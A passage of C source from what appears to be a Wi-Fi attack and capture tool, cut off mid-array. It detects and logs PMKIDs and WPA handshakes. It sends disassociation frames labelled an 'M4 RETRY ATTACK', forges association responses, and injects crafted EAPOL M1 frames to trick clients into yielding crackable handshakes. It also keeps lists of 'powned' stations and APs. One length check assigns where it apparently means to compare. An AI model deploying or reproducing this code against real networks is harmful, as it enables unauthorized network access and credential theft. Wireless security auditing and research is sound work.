static uint16_t exteaplen;

eapauthptr = payload_ptr +LLC_SIZE;
eapauthlen = payload_len -LLC_SIZE;
eapauth = (eapauth_t*)eapauthptr;
authlen = ntohs(eapauth->len);
if(authlen > (eapauthlen -4))
	{
	return;
	}
if(eapauth->type == EAPOL_KEY)
	{
	wpak = (wpakey_t*)(eapauthptr +EAPAUTH_SIZE);
	keyinfo = (getkeyinfo(ntohs(wpak->keyinfo)));
	rc = byte_swap_64(wpak->replaycount);
	if(keyinfo == 1)
		{
		if(rc == rcrandom)
			{
			if(fd_pcapng != 0)
				{
				writeepb(fd_pcapng);
				}
			memcpy(&laststam1, macfrx->addr1, 6);
			memcpy(&lastapm1, macfrx->addr2, 6);
			lastrcm1 = rc;
			lasttimestampm1 = timestamp;
			return;
			}
		if(detectpmkid(authlen, eapauthptr +EAPAUTH_SIZE) == true)
			{
			if(fd_pcapng != 0)
				{
				writeepb(fd_pcapng);
				}
			if(addpownedstaap(macfrx->addr1, macfrx->addr2, RX_PMKID) == false)
				{
				if((statusout & STATUS_EAPOL) == STATUS_EAPOL)
					{
					printtimenet(macfrx->addr1, macfrx->addr2);
					if(memcmp(macfrx->addr1, &mac_mysta, 6) == 0)
						{
						fprintf(stdout, " [FOUND PMKID CLIENT-LESS]\n");
						}
					else
						{
						fprintf(stdout, " [FOUND PMKID]\n");
						}
					}
				}
			return;
			}
		if(memcmp(&mac_mysta, macfrx->addr1, 6) != 0)
			{
			if(fd_pcapng != 0)
				{
				writeepb(fd_pcapng);
				}
			}
		return;
		}
	if(keyinfo == 3)
		{
		if(fd_pcapng != 0)
			{
			writeepb(fd_pcapng);
			}
		calceapoltimeout = timestamp -lasttimestampm2;
		if((calceapoltimeout < eapoltimeout) && ((rc -lastrcm2) == 1) && (memcmp(&laststam2,macfrx->addr1, 6) == 0) && (memcmp(&lastapm2, macfrx->addr2, 6) == 0))
			{
			if(addpownedstaap(macfrx->addr1, macfrx->addr2, RX_M23) == false)
				{
				if((statusout & STATUS_EAPOL) == STATUS_EAPOL)
					{
					printtimenet(macfrx->addr1, macfrx->addr2);
					fprintf(stdout, " [FOUND AUTHORIZED HANDSHAKE, EAPOL TIMEOUT %d]\n", calceapoltimeout);
					}
				}
			}
		memset(&laststam2, 0, 6);
		memset(&lastapm2, 0, 6);
		lastrcm2 = 0;
		lasttimestampm2 = 0;
		return;
		}
	if(keyinfo == 2)
		{
		calceapoltimeout = timestamp -lasttimestampm1;
		if((rc == rcrandom) && (memcmp(&laststam1, macfrx->addr2, 6) == 0) && (memcmp(&lastapm1, macfrx->addr1, 6) == 0))
			{
			if(fd_pcapng != 0)
				{
				writeepbm2(fd_pcapng);
				}
			if((statusout & STATUS_EAPOL) == STATUS_EAPOL)
				{
				printtimenet(macfrx->addr1, macfrx->addr2);
				fprintf(stdout, " [FOUND HANDSHAKE AP-LESS, EAPOL TIMEOUT %d]\n", calceapoltimeout);
				pownedcount++;
				}
			memset(&laststam1, 0, 6);
			memset(&lastapm1, 0, 6);
			lastrcm1 = 0;
			lasttimestampm1 = 0;
			return;
			}
		if(fd_pcapng != 0)
			{
			writeepb(fd_pcapng);
			}
		memcpy(&laststam2, macfrx->addr2, 6);
		memcpy(&lastapm2, macfrx->addr1, 6);
		lastrcm2 = rc;
		lasttimestampm2 = timestamp;
		return;
		}
	if(keyinfo == 4)
		{
		if(fd_pcapng != 0)
			{
			writeepb(fd_pcapng);
			}
		if(checkpownedstaap(macfrx->addr2, macfrx->addr1) == false)
			{
			if(disassociationflag == false)
				{
				send_disassociation(WLAN_REASON_DISASSOC_AP_BUSY);
				if((statusout & STATUS_EAPOL) == STATUS_EAPOL)
					{
					printtimenet(macfrx->addr1, macfrx->addr2);
					fprintf(stdout, " [EAPOL 4/4 - M4 RETRY ATTACK]\n");
					}
				}
			}
		memset(&laststam2, 0, 6);
		memset(&lastapm2, 0, 6);
		lastrcm2 = 0;
		lasttimestampm2 = 0;
		return;
		}
	else
		{
		if(fd_pcapng != 0)
			{
			writeepb(fd_pcapng);
			}
		}
	return;
	}
if(eapauth->type == EAP_PACKET)
	{
	if(fd_pcapng != 0)
		{
		writeepb(fd_pcapng);
		}
	if(fd_pcapng != 0)
		{
		writeepb(fd_pcapng);
		}
	exteap = (exteap_t*)(eapauthptr +EAPAUTH_SIZE);
	exteaplen = ntohs(exteap->extlen);
	if((eapauthlen != exteaplen +4) && (exteaplen -= 5))
		{
		return;
		}
	if(exteap->exttype == EAP_TYPE_ID)
		{
		if((exteap->code == EAP_CODE_REQ) && (exteap->data[0] != 0))
			{
			if((statusout & STATUS_EAPOL) == STATUS_EAPOL)
				{
				printtimenet(macfrx->addr1, macfrx->addr2);
				printid(exteaplen -5, exteap->data);
				fprintf(stdout, " [EAP REQUEST ID, SEQUENCE %d]\n", macfrx->sequence >> 4);
				}
			}
		if((exteap->code == EAP_CODE_RESP) && (exteap->data[0] != 0))
			{
			if((statusout & STATUS_EAPOL) == STATUS_EAPOL)
				{
				printtimenet(macfrx->addr1, macfrx->addr2);
				printid(exteaplen -5, exteap->data);
				fprintf(stdout, " [EAP RESPOND ID, SEQUENCE %d]\n", macfrx->sequence >> 4);
				}
			}
		}
	return;
	}

if(eapauth->type == EAPOL_START)
	{
	if(fd_pcapng != 0)
		{
		writeepb(fd_pcapng);
		}
	if(attackclientflag == false)
		{
		send_requestidentity();
		}
	return;
	}
if(eapauth->type == EAPOL_LOGOFF)
	{
	if(fd_pcapng != 0)
		{
		writeepb(fd_pcapng);
		}
	return;
	}
if(eapauth->type == EAPOL_ASF)
	{
	if(fd_pcapng != 0)
		{
		writeepb(fd_pcapng);
		}
	return;
	}
if(eapauth->type == EAPOL_MKA)
	{
	if(fd_pcapng != 0)
		{
		writeepb(fd_pcapng);
		}
	return;
	}

/* for unknown EAP types */
if(fd_pcapng != 0)
	{
	writeepb(fd_pcapng);
	}
return;
}
/*===========================================================================*/
/*===========================================================================*/
static void send_m1()
{
static mac_t *macftx;

static uint8_t anoncewpa2data[] =
{
0x88, 0x02, 0x3a, 0x01,
0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
0x11, 0x12, 0x13, 0x14, 0x15, 0x16,
0x21, 0x22, 0x23, 0x24, 0x25, 0x26,
0x00, 0x00, 0x06, 0x00,
0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8e,
0x02,
0x03,
0x00, 0x5f,
0x02,
0x00, 0x8a,
0x00, 0x10,
};
#define ANONCEWPA2_SIZE sizeof(anoncewpa2data)

static uint8_t packetout[1024];

if((filtermode == 1) && (checkfilterlistentry(macfrx->addr2) == true))
	{
	return;
	}
if((filtermode == 2) && (checkfilterlistentry(macfrx->addr2) == false))
	{
	return;
	}
if(checkpownedstaap(macfrx->addr2, macfrx->addr1) == true)
	{
	return;
	}

memset(&packetout, 0, HDRRT_SIZE +140);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
memcpy(&packetout[HDRRT_SIZE], &anoncewpa2data, ANONCEWPA2_SIZE);
macftx = (mac_t*)(packetout +HDRRT_SIZE);
memcpy(macftx->addr1, macfrx->addr2, 6);
memcpy(macftx->addr2, macfrx->addr1, 6);
memcpy(macftx->addr3, macfrx->addr1, 6);

packetout[HDRRT_SIZE +ANONCEWPA2_SIZE +7] = rcrandom &0xff;
packetout[HDRRT_SIZE +ANONCEWPA2_SIZE +6] = (rcrandom >> 8) &0xff;
memcpy(&packetout[HDRRT_SIZE +ANONCEWPA2_SIZE +8], &anoncerandom, 32);

if(send(fd_socket, packetout, HDRRT_SIZE +133, 0) < 0)
	{
	errorcount++;
	outgoingcount--;
	}
outgoingcount++;
fsync(fd_socket);
macftx->retry = 1;
if(send(fd_socket, packetout, HDRRT_SIZE +133, 0) < 0)
	{
	errorcount++;
	outgoingcount--;
	}
outgoingcount++;
fsync(fd_socket);


return;
}
/*===========================================================================*/

static inline void process80211reassociation_resp()
{
if((statusout & STATUS_ASSOC) == STATUS_ASSOC)
	{
	printtimenet(macfrx->addr1, macfrx->addr2);
	fprintf(stdout, " [REASSOCIATIONRESPONSE, SEQUENCE %d]\n", macfrx->sequence >> 4);
	}
if(fd_pcapng != 0)
	{
	writeepb(fd_pcapng);
	}
return;
}
/*===========================================================================*/
static void send_reassociationresponse()
{
static mac_t *macftx;

static const uint8_t associationresponsedata[] =
{
0x01, 0x08, 0x82, 0x84, 0x8b, 0x0c, 0x12, 0x96, 0x18, 0x24,
0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
0x2d, 0x1a, 0xaf, 0x01, 0x1b, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x04, 0x06, 0xe6, 0x47, 0x0d, 0x00,
0x3d, 0x16, 0x0d, 0x0f, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x4a, 0x0e, 0x14, 0x00, 0x0a, 0x00, 0x2c, 0x01, 0xc8, 0x00, 0x14, 0x00, 0x05, 0x00, 0x19, 0x00,
0x7f, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
0xdd, 0x18, 0x00, 0x50, 0xf2, 0x02, 0x01, 0x01, 0x00, 0x00, 0x03, 0xa4, 0x00, 0x00, 0x27, 0xa4,
0x00, 0x00, 0x42, 0x43, 0x5e, 0x00, 0x62, 0x32, 0x2f, 0x00
};
#define ASSOCIATIONRESPONSE_SIZE sizeof(associationresponsedata)

static const uint8_t associationid[] =
{
0x31, 0x04, 0x00, 0x00, 0x00, 0xc0
};
#define ASSOCIATIONID_SIZE sizeof(associationid)

static uint8_t packetout[1024];

if((filtermode == 1) && (checkfilterlistentry(macfrx->addr2) == true))
	{
	return;
	}
if((filtermode == 2) && (checkfilterlistentry(macfrx->addr2) == false))
	{
	return;
	}
if(checkpownedstaap(macfrx->addr2, macfrx->addr1) == true)
	{
	return;
	}

memset(&packetout, 0, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONID_SIZE +ASSOCIATIONRESPONSE_SIZE +1);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetout +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_REASSOC_RESP;
memcpy(macftx->addr1, macfrx->addr2, 6);
memcpy(macftx->addr2, macfrx->addr1, 6);
memcpy(macftx->addr3, macfrx->addr1, 6);
macftx->duration = 0x013a;
macftx->sequence = myassociationresponsesequence++ << 4;
if(myassociationresponsesequence >= 4096)
	{
	myassociationresponsesequence = 0;
	}
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM], &associationid, ASSOCIATIONID_SIZE);
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONID_SIZE], &associationresponsedata, ASSOCIATIONRESPONSE_SIZE);
if(send(fd_socket, packetout, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONID_SIZE +ASSOCIATIONRESPONSE_SIZE, 0) < 0)
	{
	errorcount++;
	outgoingcount--;
	}
outgoingcount++;
fsync(fd_socket);
return;
}
/*===========================================================================*/
static inline void process80211reassociation_req()
{
static uint8_t *essidtag_ptr;
static ietag_t *essidtag;
static uint8_t *reassociationrequest_ptr;
static int reassociationrequestlen;

if(attackclientflag == false)
	{
	send_reassociationresponse();
	usleep(5000);
	send_m1(macfrx->addr2,macfrx->addr1);
	}

if(payload_len < (int)CAPABILITIESSTA_SIZE)
	{
	return;
	}
reassociationrequest_ptr = payload_ptr +CAPABILITIESREQSTA_SIZE;
reassociationrequestlen = payload_len -CAPABILITIESREQSTA_SIZE;
if(reassociationrequestlen < (int)IETAG_SIZE)
	{
	return;
	}

essidtag_ptr = gettag(TAG_SSID, reassociationrequest_ptr, reassociationrequestlen);
if(essidtag_ptr == NULL)
	{
	return;
	}
essidtag = (ietag_t*)essidtag_ptr;
if(essidtag->len > ESSID_LEN_MAX)
	{
	return;
	}
if((essidtag->len == 0) || (essidtag->data[0] == 0))
	{
	return;
	}

if(fd_pcapng != 0)
	{
	writeepb(fd_pcapng);
	}

if((statusout & STATUS_ASSOC) == STATUS_ASSOC)
	{
	printtimenet(macfrx->addr1, macfrx->addr2);
	printessid(essidtag_ptr);
	fprintf(stdout, " [REASSOCIATIONREQUEST, SEQUENCE %d]\n", macfrx->sequence >> 4);
	}
return;
}
/*===========================================================================*/
static void send_associationresponse()
{
static mac_t *macftx;

static const uint8_t associationresponsedata[] =
{
0x01, 0x08, 0x82, 0x84, 0x8b, 0x0c, 0x12, 0x96, 0x18, 0x24,
0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
0x2d, 0x1a, 0xaf, 0x01, 0x1b, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x04, 0x06, 0xe6, 0x47, 0x0d, 0x00,
0x3d, 0x16, 0x0d, 0x0f, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x4a, 0x0e, 0x14, 0x00, 0x0a, 0x00, 0x2c, 0x01, 0xc8, 0x00, 0x14, 0x00, 0x05, 0x00, 0x19, 0x00,
0x7f, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
0xdd, 0x18, 0x00, 0x50, 0xf2, 0x02, 0x01, 0x01, 0x00, 0x00, 0x03, 0xa4, 0x00, 0x00, 0x27, 0xa4,
0x00, 0x00, 0x42, 0x43, 0x5e, 0x00, 0x62, 0x32, 0x2f, 0x00
};
#define ASSOCIATIONRESPONSE_SIZE sizeof(associationresponsedata)

static const uint8_t associationid[] =
{
0x31, 0x04, 0x00, 0x00, 0x00, 0xc0
};
#define ASSOCIATIONID_SIZE sizeof(associationid)

static uint8_t packetout[1024];

if((filtermode == 1) && (checkfilterlistentry(macfrx->addr2) == true))
	{
	return;
	}
if((filtermode == 2) && (checkfilterlistentry(macfrx->addr2) == false))
	{
	return;
	}
if(checkpownedstaap(macfrx->addr2, macfrx->addr1) == true)
	{
	return;
	}
memset(&packetout, 0, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONID_SIZE +ASSOCIATIONRESPONSE_SIZE +1);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetout +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_ASSOC_RESP;
memcpy(macftx->addr1, macfrx->addr2, 6);
memcpy(macftx->addr2, macfrx->addr1, 6);
memcpy(macftx->addr3, macfrx->addr1, 6);
macftx->duration = 0x013a;
macftx->sequence = myassociationresponsesequence++ << 4;
if(myassociationresponsesequence >= 4096)
	{
	myassociationresponsesequence = 0;
	}
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM], &associationid, ASSOCIATIONID_SIZE);
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONID_SIZE], &associationresponsedata, ASSOCIATIONRESPONSE_SIZE);
if(send(fd_socket, packetout, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONID_SIZE +ASSOCIATIONRESPONSE_SIZE, 0) < 0)
	{
	errorcount++;
	outgoingcount--;
	}
outgoingcount++;
fsync(fd_socket);
return;
}
/*===========================================================================*/
static inline void process80211association_resp()
{
if((statusout & STATUS_ASSOC) == STATUS_ASSOC)
	{
	printtimenet(macfrx->addr1, macfrx->addr2);
	fprintf(stdout, " [ASSOCIATIONRESPONSE, SEQUENCE %d]\n", macfrx->sequence >> 4);
	}
if(fd_pcapng != 0)
	{
	writeepb(fd_pcapng);
	}
return;
}
/*===========================================================================*/
static inline void send_associationrequest()
{
int c;
static mac_t *macftx;
static macessidlist_t *zeiger;

static const uint8_t associationrequestcapa[] =
{
0x31, 0x04, 0x0a, 0x00
};
#define ASSOCIATIONREQUESTCAPA_SIZE sizeof(associationrequestcapa)

static const uint8_t associationrequestdata[] =
{
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
0x32, 0x04, 0x0c, 0x12, 0x18, 0x60,
0x21, 0x02, 0x08, 0x14,
0x24, 0x02, 0x01, 0x0d,
0x2d, 0x1a, 0xad, 0x49, 0x17, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x7f, 0x08, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
0xdd, 0x1e, 0x00, 0x90, 0x4c, 0x33, 0xad, 0x49, 0x17, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0xdd, 0x07, 0x00, 0x50, 0xf2, 0x02, 0x00, 0x01, 0x00,

};
#define ASSOCIATIONREQUEST_SIZE sizeof(associationrequestdata)

static uint8_t packetout[1024];

if((filtermode == 1) && (checkfilterlistentry(macfrx->addr2) == true))
	{
	return;
	}
if((filtermode == 2) && (checkfilterlistentry(macfrx->addr2) == false))
	{
	return;
	}
if(checkpownedstaap(macfrx->addr1, macfrx->addr2) == true)
	{
	return;
	}
zeiger = proberesponselist;
for(c = 0; c < PROBERESPONSELIST_MAX -1; c++)
	{
	if(memcmp(zeiger->addr, &mac_null, 6) == 0)
		{
		return;
		}
	if(memcmp(zeiger->addr, macfrx->addr2, 6) == 0)
		{
		memset(&packetout, 0, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +ASSOCIATIONREQUEST_SIZE +ESSID_LEN_MAX +RSN_LEN_MAX +6);
		memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
		macftx = (mac_t*)(packetout +HDRRT_SIZE);
		macftx->type = IEEE80211_FTYPE_MGMT;
		macftx->subtype = IEEE80211_STYPE_ASSOC_REQ;
		memcpy(macftx->addr1, macfrx->addr2, 6);
		memcpy(macftx->addr2, macfrx->addr1, 6);
		memcpy(macftx->addr3, macfrx->addr2, 6);
		macftx->duration = 0x013a;
		macftx->sequence = myassociationrequestsequence++ << 4;
		if(myassociationrequestsequence >= 4096)
			{
			myassociationrequestsequence = 0;
			}
		memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM], &associationrequestcapa, ASSOCIATIONREQUESTCAPA_SIZE);
		packetout[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +1] = zeiger->essid_len;
		memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +2], zeiger->essid, zeiger->essid_len);
		memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essid_len +2], &associationrequestdata, ASSOCIATIONREQUEST_SIZE);
		packetout[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essid_len +2 +ASSOCIATIONREQUEST_SIZE] = TAG_RSN;
		packetout[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essid_len +2 +ASSOCIATIONREQUEST_SIZE +1] = zeiger->rsn_len;
		memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essid_len +2 +ASSOCIATIONREQUEST_SIZE +1 +1], zeiger->rsn, zeiger->rsn_len);
		if(send(fd_socket, packetout, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essid_len +2 +ASSOCIATIONREQUEST_SIZE +1 +1 +zeiger->rsn_len, 0) < 0)
			{
			errorcount++;
			outgoingcount--;
			}
		outgoingcount++;
		fsync(fd_socket);
		return;
		}
	zeiger++;
	}
return;
}
/*===========================================================================*/
static inline void process80211association_req()
{
static uint8_t *essidtagptr;
static ietag_t *essidtag;
static uint8_t *associationrequestptr;
static int associationrequestlen;

if(attackclientflag == false)
	{
	send_associationresponse();
	usleep(10000);
	send_m1(macfrx->addr2,macfrx->addr1);
	}

if(payload_len < (int)CAPABILITIESSTA_SIZE)
	{
	return;
	}
associationrequestptr = payload_ptr +CAPABILITIESSTA_SIZE;
associationrequestlen = payload_len -CAPABILITIESSTA_SIZE;
if(associationrequestlen < (int)IETAG_SIZE)
	{
	return;
	}

essidtagptr = gettag(TAG_SSID, associationrequestptr, associationrequestlen);
if(essidtagptr == NULL)
	{
	return;
	}
essidtag = (ietag_t*)essidtagptr;
if(essidtag->len > ESSID_LEN_MAX)
	{
	return;
	}
if((essidtag->len == 0) || (essidtag->data[0] == 0))
	{
	return;
	}

if(fd_pcapng != 0)
	{
	writeepb(fd_pcapng);
	}

if((statusout & STATUS_ASSOC) == STATUS_ASSOC)
	{
	printtimenet(macfrx->addr1, macfrx->addr2);
	printessid(essidtagptr);
	fprintf(stdout, " [ASSOCIATIONREQUEST, SEQUENCE %d]\n", macfrx->sequence >> 4);
	}
return;
}
/*===========================================================================*/
static inline void process80211authentication()
{
static authf_t *auth;

auth = (authf_t*)payload_ptr;

if(payload_len < (int)AUTHENTICATIONFRAME_SIZE)
	{
	return;
	}

if(macfrx->protected == 1)
	{
	if(fd_pcapng != 0)
		{
		writeepb(fd_pcapng);
		}
	if((statusout & STATUS_AUTH) == STATUS_AUTH)
		{
		printtimenet(macfrx->addr1, macfrx->addr2);
		fprintf(stdout, " [AUTHENTICATION, SHARED KEY ENCRYPTED KEY INSIDE]\n");
		}
	}
else if(auth->authentication_algho == OPEN_SYSTEM)
	{
	if(attackapflag == false)
		{
		if(memcmp(macfrx->addr1, &mac_mysta, 6) == 0)
			{
			send_associationrequest();
			}
		}
	if(attackclientflag == false)
		{
		if(auth->authentication_seq == 1)
			{
			if(memcmp(macfrx->addr2, &mac_mysta, 6) != 0)
				{
				send_authenticationresponseopensystem();
				}
			}
		}
	if(fd_pcapng != 0)
		{
		if(payload_len > 6)
			{
			writeepb(fd_pcapng);
			}
		}
	if((statusout & STATUS_AUTH) == STATUS_AUTH)
		{
		printtimenet(macfrx->addr1, macfrx->addr2);
		fprintf(stdout, " [AUTHENTICATION, OPEN SYSTEM, SEQUENCE %d, STATUS %d]\n", macfrx->sequence >> 4, auth->authentication_seq);
		}
	}
else if(auth->authentication_algho == SHARED_KEY)
	{
	if(fd_pcapng != 0)
		{
		writeepb(fd_pcapng);
		}
	if((statusout & STATUS_AUTH) == STATUS_AUTH)
		{
		printtimenet(macfrx->addr1, macfrx->addr2);
		fprintf(stdout, " [AUTHENTICATION, SHARED KEY, STATUS %d]\n", auth->authentication_seq);
		}
	}
else if(auth->authentication_algho == FBT)
	{
	if(fd_pcapng != 0)
		{
		writeepb(fd_pcapng);
		}
	if((statusout & STATUS_AUTH) == STATUS_AUTH)
		{
		printtimenet(macfrx->addr1, macfrx->addr2);
		fprintf(stdout, " [AUTHENTICATION, FAST TRANSITION, STATUS %d]\n", auth->authentication_seq);
		}
	}
else if(auth->authentication_algho == SAE)
	{
	if(fd_pcapng != 0)
		{
		writeepb(fd_pcapng);
		}
	if((statusout & STATUS_AUTH) == STATUS_AUTH)
		{
		printtimenet(macfrx->addr1, macfrx->addr2);
		fprintf(stdout, " [AUTHENTICATION, SAE, STATUS %d]\n", auth->authentication_seq);
		}
	}
else if(auth->authentication_algho == FILS)
	{
	if(fd_pcapng != 0)
		{
		writeepb(fd_pcapng);
		}
	if((statusout & STATUS_AUTH) == STATUS_AUTH)
		{
		printtimenet(macfrx->addr1, macfrx->addr2);
		fprintf(stdout, " [AUTHENTICATION, FILS, STATUS %d]\n", auth->authentication_seq);
		}
	}
else if(auth->authentication_algho == FILSPFS)
	{
	if(fd_pcapng != 0)
		{
		writeepb(fd_pcapng);
		}
	if((statusout & STATUS_AUTH) == STATUS_AUTH)
		{
		printtimenet(macfrx->addr1, macfrx->addr2);
		fprintf(stdout, " [AUTHENTICATION, FILS PFS, STATUS %d]\n", auth->authentication_seq);
		}
	}
else if(auth->authentication_algho == FILSPK)
	{
	if(fd_pcapng != 0)
		{
		writeepb(fd_pcapng);
		}
	if((statusout & STATUS_AUTH) == STATUS_AUTH)
		{
		printtimenet(macfrx->addr1, macfrx->addr2);
		fprintf(stdout, " [AUTHENTICATION, FILS PK, STATUS %d]\n", auth->authentication_seq);
		}
	}
else if(auth->authentication_algho == NETWORKEAP)
	{
	if(fd_pcapng != 0)
		{
		writeepb(fd_pcapng);
		}
	if((statusout & STATUS_AUTH) == STATUS_AUTH)
		{
		printtimenet(macfrx->addr1, macfrx->addr2);
		fprintf(stdout, " [AUTHENTICATION, NETWORK EAP, STATUS %d]\n", auth->authentication_seq);
		}
	}
else
	{
	if(fd_pcapng != 0)
		{
		writeepb(fd_pcapng);
		}
	}

return;
}
/*===========================================================================*/
static inline void process80211probe_resp()
{
static int c;
static macessidlist_t *zeiger;

static uint8_t *proberequestptr;
static int proberequestlen;

static uint8_t *essidtagptr;
static ietag_t *essidtag = NULL;

static uint8_t *channeltagptr;
static ietag_t *channeltag = NULL;
int apchannel;

static uint8_t *rsntagptr;
static ietag_t *rsntag = NULL;
int rsnlen;


if(payload_len < (int)CAPABILITIESAP_SIZE)
	{
	return;
	}

proberequestptr = payload_ptr +CAPABILITIESAP_SIZE;
proberequestlen = payload_len -CAPABILITIESAP_SIZE;

if(proberequestlen < (int)IETAG_SIZE)
	{
	return;
	}

essidtagptr = gettag(TAG_SSID, proberequestptr, proberequestlen);
if(essidtagptr == NULL)
	{
	return;
	}
essidtag = (ietag_t*)essidtagptr;
if(essidtag->len > ESSID_LEN_MAX)
	{
	return;
	}
if((essidtag->len == 0) || (essidtag->data[0] == 0))
	{
	return;
	}

apchannel = channelscanlist[cpa];
channeltagptr = gettag(TAG_CHAN, proberequestptr, proberequestlen);
if(channeltagptr != NULL)
	{
	channeltag = (ietag_t*)channeltagptr;
	apchannel = channeltag->data[0];
	}

rsnlen = 0;
rsntagptr = gettag(TAG_RSN, proberequestptr, proberequestlen);
if(rsntagptr != NULL)
	{
	rsntag = (ietag_t*)rsntagptr;
	rsnlen = rsntag->len;
	}

if(attackapflag == false)
	{
	if(rsnlen != 0)
		{
		if(memcmp(&mac_mysta, macfrx->addr1, 6) == 0)
			{
			send_authenticationrequestopensystem();
			}
		}
	}

zeiger = proberesponselist;
for(c = 0; c < PROBERESPONSELIST_MAX -1; c++)
	{
	if(memcmp(zeiger->addr, &mac_null, 6) == 0)
		{
		break;
		}
	if((memcmp(zeiger->addr, macfrx->addr2, 6) == 0) && (zeiger->essid_len == essidtag->len) && (memcmp(zeiger->essid, essidtag->data, essidtag->len) == 0))
		{
		zeiger->timestamp = timestamp;
		return;
		}
	zeiger++;
	}

zeiger->timestamp = timestamp;
zeiger->status = 0;
memcpy(zeiger->addr, macfrx->addr2, 6);
zeiger->essid_len = essidtag->len;
memset(zeiger->essid, 0, ESSID_LEN_MAX);
memcpy(zeiger->essid, essidtag->data, essidtag->len);
if((rsnlen >= 20) && (rsnlen <= RSN_LEN_MAX))
	{
	zeiger->rsn_len = rsntag->len;
	memset(zeiger->rsn, 0, rsntag->len);
	memcpy(zeiger->rsn, rsntag->data, rsntag->len);
	}

qsort(proberesponselist, c +1, MACESSIDLIST_SIZE, sort_macessidlist_by_time);

if(fd_pcapng != 0)
	{
	writeepb(fd_pcapng);
	}
if((statusout & STATUS_PROBES) == STATUS_PROBES)
	{
	printtimenet(macfrx->addr1, macfrx->addr2);
	printessid(essidtagptr);
	fprintf(stdout, " [PROBERESPONSE, SEQUENCE %d, AP CHANNEL %d]\n", macfrx->sequence >> 4, apchannel);
	}
return;
}
/*===========================================================================*/
static inline void send_proberesponse(uint8_t *macap, uint8_t *essidtagptr)
{
static mac_t *macftx;
static capap_t *capap;
static ietag_t *essidtag;

const uint8_t proberesponsedata[] =
{
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,
0x03, 0x01, 0x05,
0x2a, 0x01, 0x00,
0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
0x2d, 0x1a, 0xef, 0x11, 0x1b, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x04, 0x06, 0xe6, 0x47, 0x0d, 0x00,
0x3d, 0x16, 0x05, 0x0d, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
0xdd, 0x18, 0x00, 0x50, 0xf2, 0x02, 0x01, 0x01, 0x00, 0x00, 0x03, 0xa4, 0x00, 0x00, 0x27, 0xa4,
0x00, 0x00, 0x42, 0x43, 0x5e, 0x00, 0x62, 0x32, 0x2f, 0x00,
0xdd, 0x09, 0x00, 0x03, 0x7f, 0x01, 0x01, 0x00, 0x00, 0xff, 0x7f,
